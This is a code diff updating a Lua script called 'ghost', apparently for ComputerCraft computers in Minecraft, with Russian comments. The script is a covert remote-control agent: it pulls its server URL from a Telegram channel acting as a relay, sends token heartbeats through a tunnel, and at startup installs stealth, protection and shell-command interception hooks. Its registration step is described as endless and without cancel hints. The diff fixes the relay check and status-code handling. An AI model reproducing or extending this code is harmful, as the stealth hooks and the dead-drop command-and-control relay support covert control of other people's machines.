@@ -1,4 +1,4 @@
--- ghost v9.9.3 (health-based validation, POST reload, URL integrity check)
+-- ghost v9.9.4 (fixed relay private-check + status code bug)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -109,7 +109,6 @@ local function do_update()
     print("=== UPDATING GHOST ===\n")
     print("Source: GitHub\n")
     print("URL: " .. GITHUB_URL .. "\n")
-    
     local ok, h = pcall(http.get, GITHUB_URL, {
         ["User-Agent"]="ghost-updater",
         ["bypass-tunnel-reminder"]="true",
@@ -320,7 +319,7 @@ local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") en
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
 -- ============================================
--- URL MANAGEMENT (v9.9.3: health-based + integrity check)
+-- URL MANAGEMENT (v9.9.4: FIXED private-check)
 -- ============================================
 local function save_url(url)
     local f = orig_fs_open(URL_FILE, "w")
@@ -341,7 +340,6 @@ local function replace_domain(url, newdomain)
     return scheme .. newdomain .. path
 end
 
--- НОВОЕ: проверка что URL содержит lhr.life (защита от подмены)
 local function is_valid_tunnel_url(url)
     if not url or url == "" then return false end
     if not url:find("^https://") then return false end
@@ -349,15 +347,12 @@ local function is_valid_tunnel_url(url)
     return true
 end
 
--- УЛУЧШЕНО: health-based validation с fallback
 local function validate_url(url)
     if not url or url == "" then return false end
     if not is_valid_tunnel_url(url) then
         glog("validate: invalid URL format: " .. tostring(url))
         return false
     end
-    
-    -- Пытаемся /api/health (даёт больше инфы)
     local ok, h = pcall(http.get, url .. "/api/health", {
         ["bypass-tunnel-reminder"]="true",
         ["User-Agent"]="ghost-validator"
@@ -368,15 +363,12 @@ local function validate_url(url)
         if o and resp and resp ~= "" then
             local o2, data = pcall(textutils.unserializeJSON, resp)
             if o2 and data then
-                -- Сервер ответил, туннель работает
                 local status = data.status or data.bot_status
                 glog("validate: /api/health OK, status=" .. tostring(status))
                 return true, url
             end
         end
     end
-    
-    -- Fallback: пробуем /api/url
     glog("validate: /api/health failed, trying /api/url")
     ok, h = pcall(http.get, url .. "/api/url", {
         ["bypass-tunnel-reminder"]="true",
@@ -409,6 +401,7 @@ local function validate_url(url)
     return true, url
 end
 
+-- ИСПРАВЛЕНО: правильная проверка приватности
 local function fetch_relay_urls()
     local url = "https://t.me/s/" .. RELAY_USERNAME
     local ok, h = pcall(http.get, url, {
@@ -425,11 +418,12 @@ local function fetch_relay_urls()
         glog("relay: readAll fail")
         return {} 
     end
-    if htmlc:find("tgme_channel_join", 1, true) or htmlc:find("tgme_icon_preview", 1, true) then
-        glog("relay: CHANNEL IS PRIVATE!")
+    glog("relay: got " .. #htmlc .. " bytes")
+    -- ПРАВИЛЬНАЯ проверка: ищем посты (tgme_widget_message)
+    if not htmlc:find("tgme_widget_message", 1, true) then
+        glog("relay: no posts found (channel private or empty)")
         return {}
     end
-    glog("relay: got " .. #htmlc .. " bytes")
     htmlc = htmlc:gsub("&lt;", "<"):gsub("&gt;", ">"):gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&#x27;", "'")
     local urls = {}
     local seen = {}
@@ -446,7 +440,6 @@ local function fetch_relay_urls()
     return urls
 end
 
--- УЛУЧШЕНО: перебираем все URL, не останавливаемся на первом мёртвом
 local function get_fresh_url()
     local urls = fetch_relay_urls()
     if #urls == 0 then
@@ -501,7 +494,6 @@ refresh_url = function()
     return nil
 end
 
--- УЛУЧШЕНО: POST вместо GET (не кэшируется)
 reload_tunnel = function()
     if not CURRENT_URL then return false end
     glog("reload_tunnel: requesting server restart via POST")
@@ -634,7 +626,7 @@ local function save_mode(m)
 end
 
 -- ============================================
--- HTTP (с логированием)
+-- HTTP (v9.9.4: FIXED status code)
 -- ============================================
 local function make_headers(token)
     local h = {}
@@ -644,7 +636,7 @@ local function make_headers(token)
     return h
 end
 
--- УЛУЧШЕНО: возвращает status code
+-- ИСПРАВЛЕНО: правильный разбор status code
 local function http_request_with_status(url, body, headers, method)
     local ok, h
     if method == "POST" then
@@ -658,23 +650,26 @@ local function http_request_with_status(url, body, headers, method)
         local ev, p1, p2 = orig_pullEvent()
         if ev == "http_success" and p1 == url then
             os.cancelTimer(timer)
-            local t = (p2 and p2.readAll and pcall(function() return p2.readAll() end)) or ""
+            local t = ""
+            if p2 and p2.readAll then
+                local rok, rt = pcall(function() return p2.readAll() end)
+                if rok and rt then t = rt end
+            end
             if type(t) == "table" then t = t[1] or "" end
-            -- Получаем status code (если доступен)
-            local status_code = (p2 and p2.getResponseCode and pcall(function() return p2.getResponseCode() end)) or nil
-            if type(status_code) == "table" then status_code = status_code[1] end
             pcall(function() if p2 and p2.close then p2.close() end end)
             local o, p = pcall(textutils.unserializeJSON, t or "")
-            return (o and p or nil), status_code
+            return (o and p or nil), 200
         elseif ev == "http_failure" and p1 == url then
             os.cancelTimer(timer)
-            -- Получаем status code при failure
-            local status_code = (p2 and p2.getResponseCode and pcall(function() return p2.getResponseCode() end)) or nil
-            if type(status_code) == "table" then status_code = status_code[1] end
+            local sc = nil
+            if p2 and p2.getResponseCode then
+                local sok, sret = pcall(function() return p2.getResponseCode() end)
+                if sok then sc = sret end
+            end
             pcall(function() if p2 and p2.close then p2.close() end end)
-            return nil, status_code
-        elseif ev == "timer" and p1 == timer then 
-            return nil, nil 
+            return nil, sc
+        elseif ev == "timer" and p1 == timer then
+            return nil, nil
         end
     end
 end
@@ -689,11 +684,9 @@ local function http_post(url, data, headers)
     return r, sc
 end
 
--- УЛУЧШЕНО: пробует refresh_url и возвращает status
 local function http_get_smart(url, headers, token)
     local r, sc = http_get(url, headers)
     if r then return r, sc end
-    -- Если 401/403 - токен инвалидный, не refresh'им
     if sc == 401 or sc == 403 then
         glog("http_get_smart: auth error " .. tostring(sc))
         return nil, sc
@@ -721,7 +714,7 @@ send_heartbeat = function(token, pastes)
         make_headers(token), token)
     if not r then
         heartbeat_fails = heartbeat_fails + 1
-        glog("heartbeat: failed, total fails=" .. heartbeat_fails .. ", status=" .. tostring(sc))
+        glog("heartbeat: failed, total=" .. heartbeat_fails .. ", status=" .. tostring(sc))
         return false, sc
     end
     heartbeat_fails = 0
@@ -781,7 +774,7 @@ end
 local function disable_command_intercept() shell.run = orig_shell_run end
 
 -- ============================================
--- REGISTRATION (БЕСКОНЕЧНАЯ, БЕЗ CANCEL-ПОДСКАЗОК)
+-- REGISTRATION (бесконечная, без cancel-подсказок)
 -- ============================================
 local function register_sync(url, pw)
     if not url or not pw or pw == "" then return nil end
@@ -907,7 +900,7 @@ local function fortress_console()
 end
 
 -- ============================================
--- LOOPS (УЛУЧШЕННЫЙ heartbeat с auto-reload)
+-- LOOPS
 -- ============================================
 local function heartbeat_loop(token)
     glog("heartbeat loop start")
@@ -1031,7 +1024,7 @@ end
 -- MAIN
 -- ============================================
 local function run_main()
-    glog("ghost start v9.9.3")
+    glog("ghost start v9.9.4")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
